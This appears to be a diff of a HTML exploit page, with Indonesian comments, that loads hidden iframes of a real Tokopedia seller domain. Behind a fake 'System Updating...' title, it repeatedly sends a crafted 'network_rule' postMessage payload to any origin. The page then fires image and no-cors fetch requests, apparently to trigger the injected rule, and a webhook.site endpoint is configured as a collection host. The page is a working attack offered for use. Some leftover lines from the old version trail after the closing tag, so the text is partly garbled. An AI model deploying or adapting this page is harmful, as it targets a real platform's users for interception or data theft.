@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Loading...</title></head>
+<head><title>System Updating...</title></head>
 <body>
-    <iframe id="target_frame" src="https://shop-id.tokopedia.com/" style="display:none;"></iframe>
+    <h1 id="log">Initializing Zero-Click...</h1>
+    <iframe id="gate1" src="https://shop-id.tokopedia.com/robots.txt" style="display:none;"></iframe>
+    <iframe id="gate2" src="https://shop-id.tokopedia.com/manifest.json" style="display:none;"></iframe>
 
     <script>
-        const frame = document.getElementById('target_frame');
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // Ganti ID Webhook lu
-
+        const webhook = "https://webhook.site/ID_LU_BARU";
         const payload = {
             source: "main_thread",
             eventName: "network_rule",
             data: [{
-                ruleName: "zero_click_final",
+                ruleName: "bypass_100000",
                 global: true,
                 conditions: [],
                 handlers: [{
@@ -24,16 +24,37 @@
             }]
         };
 
-        function attemptInjection() {
+        function shoot(target) {
             try {
-                // Mengirim pesan ke contentWindow Iframe
-                frame.contentWindow.postMessage(payload, "*");
-                console.log("Payload sent...");
-            } catch (e) {
-                console.log("Retrying...");
-            }
+                target.contentWindow.postMessage(payload, "*");
+                console.log("Shot fired to: " + target.src);
+            } catch(e) {}
         }
 
+        window.onload = function() {
+            // Spam postMessage selama 5 detik pertama
+            let attempts = 0;
+            const interval = setInterval(() => {
+                shoot(document.getElementById('gate1'));
+                shoot(document.getElementById('gate2'));
+                attempts++;
+                if(attempts > 20) clearInterval(interval);
+            }, 500);
+
+            // Trigger fetch setelah 8 detik
+            setTimeout(() => {
+                document.getElementById('log').innerText = "Triggering Webhook...";
+                // Trigger via Image (No-Cors)
+                const img = new Image();
+                img.src = "https://shop-id.tokopedia.com/favicon.ico?v=" + Date.now();
+                
+                // Trigger via Fetch
+                fetch("https://shop-id.tokopedia.com/robots.txt", { mode: 'no-cors' });
+            }, 8000);
+        };
+    </script>
+</body>
+</html>
         // Jalankan injeksi berkali-kali untuk memastikan SW menangkapnya
         const interval = setInterval(attemptInjection, 500);
 
